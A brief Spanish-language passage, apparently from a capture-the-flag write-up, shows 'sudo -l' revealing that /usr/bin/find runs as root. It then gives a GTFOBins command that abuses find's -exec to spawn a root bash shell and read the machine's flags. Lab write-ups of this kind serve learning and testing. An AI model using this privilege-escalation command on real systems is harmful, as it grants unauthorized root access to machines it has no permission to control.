#abusobinariofind

------

Con `sudo -l` vemos que el binario /usr/bin/find se ejecuta como root
![[Base19.png]]


[Articulo de gtfobinds donde se saco este payload](https://gtfobins.github.io/gtfobins/find/#suid)
```
sudo /usr/bin/find . -exec /bin/bash -p \; -quit
```
![[Base20.png]]
Ya podemos catear las flags para terminar la maguina